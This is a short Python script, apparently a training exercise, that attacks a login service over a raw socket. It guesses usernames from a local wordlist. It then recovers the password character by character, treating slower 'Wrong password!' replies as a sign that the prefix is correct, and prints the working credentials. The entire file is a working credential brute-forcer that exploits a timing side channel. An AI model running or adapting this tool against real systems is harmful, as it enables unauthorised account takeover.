import socket
import argparse
import itertools
import json
import string
import time


def login(new_socket):
    with open('A:\\downloads\\logins.txt', 'r', encoding='utf-8') as f:
        logins = f.readlines()
        for login in logins:
            login = login.strip('\n')
            data = dict(login=login, password=' ')
            data = json.dumps(data, indent=4)
            data = data.encode()
            new_socket.send(data)
            response = new_socket.recv(1024)
            response = response.decode()
            response = json.loads(response)
            if response['result'] == 'Wrong login!':
                continue
            else:
                found_login = login
                break
        return found_login


def password_seeker(new_socket, login):
    password = ''
    gen = itertools.product(string.ascii_letters + string.digits)
    while True:
        letter = next(gen)
        letter = ''.join(letter)
        data = dict(login=login, password=password + letter)
        data = json.dumps(data, indent=4)
        data = data.encode()
        start_time = time.time()
        new_socket.send(data)
        response = new_socket.recv(1024)
        response = response.decode()
        response = json.loads(response)
        end_time = time.time()
        diff = (end_time - start_time) * 1000
        if response['result'] == 'Wrong password!':
            if diff >= 90:
                password += letter
                gen = itertools.product(string.ascii_letters + string.digits)
        elif response['result'] == 'Connection success!':
            data = data.decode()

            return print(data)


def connection(host, port):
    with socket.socket() as new_socket:
        address = (host, int(port))
        new_socket.connect(address)
        needed_login = login(new_socket)
        password_seeker(new_socket, needed_login)


argument = argparse.ArgumentParser()
argument.add_argument('host')
argument.add_argument('port')
all_args = argument.parse_args()
connection(all_args.host, all_args.port)
